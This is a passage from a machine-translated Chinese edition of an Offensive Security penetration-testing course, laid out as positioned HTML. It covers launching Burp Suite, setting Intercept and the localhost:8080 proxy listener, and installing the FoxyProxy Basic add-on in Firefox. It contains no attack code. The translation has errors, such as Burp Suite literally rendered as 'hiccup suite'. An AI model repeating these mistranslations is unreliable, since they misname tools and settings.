<div style="position:absolute;top:35193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们启动 Burp Suite。</font><font style="vertical-align: inherit;">我们可以在 Kali 中的 Applications &gt; 03 Web Application Analysis &gt; 下找到它</font></font></nobr></div>
<div style="position:absolute;top:35212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">burpsuite。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:35687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">244 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PortSwigger，2019 年），https://portswigger.net/burp</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:35815;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="31"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 31 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:35848;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:36925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:36925;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:36925;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">251</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:36373;left:376"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 90：启动 Burp Suite</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:36404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们也可以使用 burpsuite 从命令行启动它：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:36439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">burpsuite</font></font></font></b></nobr></div>
<div style="position:absolute;top:36458;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 282 - 从终端 shell 启动 Burp Suite</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:36487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动后，我们将选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Temporary project</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Next</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:37003;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="32"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 32 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:37036;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:38113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:38113;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:38113;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">252</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37532;left:393"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 91：Burp 启动</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:37563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将</font><font style="vertical-align: inherit;">选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Use Burp 默认值</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Start Burp</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37996;left:375"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 92：Burp 配置 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:38191;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="33"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 33 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:38224;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:39301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:39301;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:39301;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">253</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:38314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:38335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">片刻之后，UI 将加载。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:38840;left:358"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 93：Burp Suite 用户界面</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:38871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们从</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具</font><font style="vertical-align: inherit;">开始</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">使用这个工具，我们可以拦截浏览器发送的任何请求</font></font></nobr></div>
<div style="position:absolute;top:38890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在它被传递到服务器之前。</font><font style="vertical-align: inherit;">此时我们几乎可以更改有关请求的任何内容，</font></font></nobr></div>
<div style="position:absolute;top:38909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如参数名称、表单值或添加新标题。</font><font style="vertical-align: inherit;">这让我们可以测试应用程序如何</font></font></nobr></div>
<div style="position:absolute;top:38929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理意外的任意输入。</font><font style="vertical-align: inherit;">例如，输入字段的大小限制可能为 20</font></font></nobr></div>
<div style="position:absolute;top:38948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符，但我们可以使用 Burp Suite 修改提交 30 个字符的请求。</font></font></nobr></div>
<div style="position:absolute;top:38981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了设置代理，我们将首先单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡以显示几个子选项卡并禁用</font></font></nobr></div>
<div style="position:absolute;top:39001;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拦截</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具，位于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拦截</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡下。</font><font style="vertical-align: inherit;">当</font><font style="vertical-align: inherit;">启用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拦截时</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们必须手动点击</font></font></nobr></div>
<div style="position:absolute;top:39020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">on </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Forward</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将每个请求向前发送到其目的地。</font><font style="vertical-align: inherit;">或者，我们可以单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Drop</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不</font></font></i></nobr></div>
<div style="position:absolute;top:39039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送请求。</font><font style="vertical-align: inherit;">有时我们会想要拦截流量并修改它，但是当我们</font></font></nobr></div>
<div style="position:absolute;top:39059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只是浏览一个网站，必须</font><font style="vertical-align: inherit;">在每个请求上</font><font style="vertical-align: inherit;">单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转发</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变得非常乏味。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:39379;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="34"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 34 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:39412;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:40489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:40489;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:40489;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">254</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:39502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:39523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所述</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拦截是开/关</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">切换按钮显示工具的当前状态，并且可以被用于使</font></font></nobr></div>
<div style="position:absolute;top:39542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或根据需要禁用它。</font><font style="vertical-align: inherit;">因此，我们将其设置为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intercept is off</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以允许我们的浏览器流量</font></font></nobr></div>
<div style="position:absolute;top:39561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正常流动：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40067;left:370"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 94：关闭拦截 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:40567;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="35"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 35 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:40600;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:41677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:41677;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:41677;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">255</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:40690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.3</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40711;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们可以查看代理侦听器设置。</font><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子标签会显示哪些端口是听</font></font></nobr></div>
<div style="position:absolute;top:40730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于代理请求。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:41235;left:385"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 95：代理侦听器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:41266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，Burp Suite 在 localhost:8080 上启用代理侦听器。</font><font style="vertical-align: inherit;">这是我们的主机和端口</font></font></nobr></div>
<div style="position:absolute;top:41285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">浏览器必须连接到以通过 Burp Suite 代理流量。</font><font style="vertical-align: inherit;">我们将保留这些默认值</font></font></nobr></div>
<div style="position:absolute;top:41305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:41755;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="36"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 36 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:41788;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:42865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:42865;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:42865;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">256</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:41878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.4</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:41899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拦截</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具在打嗝套房的默认配置启动时启用。</font><font style="vertical-align: inherit;">我们可以检查这个</font></font></nobr></div>
<div style="position:absolute;top:41918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">User options</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Misc</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proxy Interception</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下设置</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">但是，许多用户更喜欢禁用</font></font></nobr></div>
<div style="position:absolute;top:41937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动时拦截，可以通过选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Always disable</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来完成</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">不管怎样，我们仍然可以</font></font></nobr></div>
<div style="position:absolute;top:41957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proxy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intercept</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intercept is on/off</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动打开和关闭</font><i><font style="vertical-align: inherit;">拦截</font></i><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:42462;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 96：在启动时禁用拦截 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:42943;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="37"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 37 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:42976;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:44053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:44053;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:44053;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">257</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:43066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.5</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proxy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，然后</font><font style="vertical-align: inherit;">选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP history</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">内容将是空白的，直到流量被发送</font></font></nobr></div>
<div style="position:absolute;top:43106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 Burp Suite：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43421;left:391"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 97：代理历史</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">据其作者介绍，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FoxyProxy Basic </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">245</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 Firefox 的“简单开/关代理切换器”插件。</font></font></nobr></div>
<div style="position:absolute;top:43471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用它来启用或禁用 Firefox 代理设置。</font><font style="vertical-align: inherit;">让我们现在安装它。</font><font style="vertical-align: inherit;">我们能做到</font></font></nobr></div>
<div style="position:absolute;top:43490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Firefox 中单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开菜单</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按钮并从菜单中选择“附加组件”：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43780;left:392"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 98：Firefox 菜单</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:44003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">245 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mozilla，2019），https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-basic/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:44131;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="38"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 38 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:44164;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:45241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:45241;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:45241;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">258</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:44254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.6</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">附加组件管理器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">页面打开时，我们将通过在其输入搜索“FoxyProxy基本”</font></font></nobr></div>
<div style="position:absolute;top:44294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">页面右上角的搜索框并按回车键：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44763;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 99：Firefox 附加组件管理器 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:45319;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="39"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 39 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:45352;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:46429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:46429;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:46429;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">259</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:45442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.7</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在撰写本文时，有两个版本的 FoxyProxy 可用：基本版和标准版。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:45482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将使用 Basic，因为它更容易配置，我们不需要任何额外的功能</font></font></nobr></div>
<div style="position:absolute;top:45501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准版：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45971;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 100：Firefox 附加组件搜索结果 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:46507;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="40"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 40 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:46540;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:47617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:47617;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:47617;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">260</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:46630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.8</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FoxyProxy Basic</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看有关扩展的更多详细信息，然后单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加到 Firefox</font></font></i></nobr></div>
<div style="position:absolute;top:46670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装附加组件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47139;left:378"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 101：FoxyProxy 基本版</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
